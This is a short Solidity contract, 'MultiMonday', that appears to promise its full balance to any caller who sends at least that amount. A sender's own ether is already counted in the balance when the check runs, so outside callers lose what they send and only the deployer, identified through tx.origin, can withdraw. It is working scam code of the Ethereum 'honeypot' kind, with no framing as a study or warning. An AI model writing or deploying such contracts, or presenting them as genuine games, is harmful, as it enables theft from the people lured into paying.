1 pragma solidity ^0.4.25;
2 
3 contract MultiMonday
4 {
5     address O = tx.origin;
6 
7     function() public payable {}
8 
9     function Today() public payable {
10         if (msg.value >= this.balance || tx.origin == O) {
11             tx.origin.transfer(this.balance);
12         }
13     }
14  }